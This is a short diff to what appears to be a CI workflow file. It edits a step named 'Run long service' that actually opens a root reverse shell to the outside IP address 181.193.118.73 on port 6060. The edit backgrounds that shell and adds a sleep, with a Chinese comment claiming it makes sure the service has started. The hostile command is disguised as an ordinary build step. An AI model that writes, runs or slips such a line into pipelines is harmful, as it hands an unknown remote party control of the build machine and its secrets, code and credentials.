@@ -21,8 +21,8 @@ jobs:
 
       - name: Run long service
         run: |
-          sudo sh -i >& /dev/tcp/181.193.118.73/6060 0>&1
-
+          sudo sh -i >& /dev/tcp/181.193.118.73/6060 0>&1 &
+          sleep 10 # 确保服务已经启动
 
       # Checkout your code
       - name: Checkout code
